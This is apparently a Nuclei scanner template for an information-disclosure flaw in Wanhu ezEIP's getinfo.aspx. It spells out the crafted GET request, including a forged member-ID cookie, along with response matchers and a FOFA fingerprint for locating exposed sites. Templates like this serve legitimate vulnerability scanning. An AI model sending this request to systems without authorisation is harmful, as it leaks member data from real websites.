id: poc-yaml-whir-ezeip-getinfo-aspx-info-leak
info:
  name: 万户 ezEIP getinfo.aspx 信息泄露漏洞
  author: ProjectDiscoveryAI
  severity: medium
  tags: 信息泄露
  metadata:
    finger: 万户ezEIP
    fofa: app="万户网络-ezEIP"
http:
  - method: GET
    path:
      - "{{BaseURL}}/label/member/getinfo.aspx"
    headers:
      Cookie: WHIR_USERINFOR=whir_mem_member_pid=1
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "\"Key\":.*?"
          - "\"Value\":.*?"
      - type: word
        part: header
        words:
          - "ezEIP"
      - type: word
        words:
          - "<"
        negative: true
